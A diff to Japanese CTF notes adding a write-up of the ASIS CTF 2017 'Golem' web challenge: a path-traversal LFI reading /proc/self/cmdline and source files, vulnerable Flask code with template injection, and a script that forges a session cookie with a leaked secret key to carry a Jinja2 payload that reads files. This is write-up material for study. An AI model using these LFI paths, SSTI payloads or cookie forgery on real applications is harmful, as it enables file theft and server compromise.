@@ -1114,10 +1114,79 @@ print(get_name_for_avatar(st, people_obj = people) )
 {'result':true, 'email':'{email}{user.set_password.__globals__[auth].admin.settings.SECRET_FLAG}FLAG{IU_Is_the_b3st_singer_ev3r!}'}
 ```
 
-## sample
+## jinja2 / LFI / session['']に暗号化鍵で暗号化した値をセット (ASIS_CTF 2017 Golem)
+https://github.com/bl4de/ctf/blob/master/2017/ASIS_CTF_2017/Golem/Golem_Web_writeup.md   
 - **entrypoint**    
+LFIができることがまずわかっていて、そこから`../../../proc/self/cmdline`で現在のプロセスを実行するために使われたコマンドを特定して、そこから`.ini`ファイルが見つかってその`.ini`ファイルを読むとWebのserver.pyのフルパスがわかってそれをLFIする。   
+`render_template_string`にユーザーの入力が入るのでSSTI可能！   
 - **概要**    
+`session['golem']`の値がセットされていないければ`session['golem']`に`GET ?golem=`の値をセットしてそれが`template`変数に入る。ここで`GET ?golem=`の値は`.`,`_`,`{`,`}`がフィルタリングされる。   
+`GET ?golem=`の値をセットせず、`session['golem']`の値がセットされていれば、この値をそのまま`template`変数に挿入して、フィルタリングなしでSSTIできる！   
+```python
+execfile('flag.py')
+execfile('key.py')
+
+FLAG = flag
+app.secret_key = key
+
+
+@app.route("/golem", methods=["GET", "POST"])
+def golem():
+    if request.method != "POST":
+        return redirect(url_for("index"))
+
+    golem = request.form.get("golem") or None
+
+    if golem is not None:
+        golem = golem.replace(".", "").replace(
+            "_", "").replace("{", "").replace("}", "")
+
+    if "golem" not in session or session['golem'] is None:
+        session['golem'] = golem
+
+    template = None
+
+    if session['golem'] is not None:
+        template = '''{% % extends "layout.html" % %}
+		{% % block body % %}
+		<h1 > Golem Name < /h1 >
+		<div class ="row >
+		<div class = "col-md-6 col-md-offset-3 center" >
+		Hello: % s, why you don't look at our <a href=' / article?name = article'> article < /a >?
+		< / div >
+		< / div >
+		{% % endblock % %}
+		''' % session['golem']
+
+        print
+
+        session['golem'] = None
+
+    return render_template_string(template)
+```
+`session['golem']`、つまり`Cookie: golem=aaaaa`みたいに値をセットするにはFlaskでは`app.secret_key`で暗号化(?)されることになる。つまり任意の値をCookieにセットするには、この暗号化キーを特定して、暗号化したデータをCookieにセットすればよい。   
+今回は暗号化キーは`key.py`から読み込んでいるので、LFIでその内容を出力する。   
+
 - **Payload**    
+以下でLFIによって特定した暗号化キーでCookieの値を暗号化する。   
+```python
+from flask import (
+    Flask,
+    session)
+from flask.ext.session import Session
+
+
+app = Flask(__name__)
+app.secret_key = "7h15_5h0uld_b3_r34lly_53cur3d"
+
+@app.route('/')
+def hello_world():
+    session["golem"] = "{{''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()}}" 
+
+    print session
+    return session["golem"]
+```
+これを実行して、暗号化した値をCookieにセットすればFlagゲット！   
 ## sample
 - **entrypoint**    
 - **概要**    
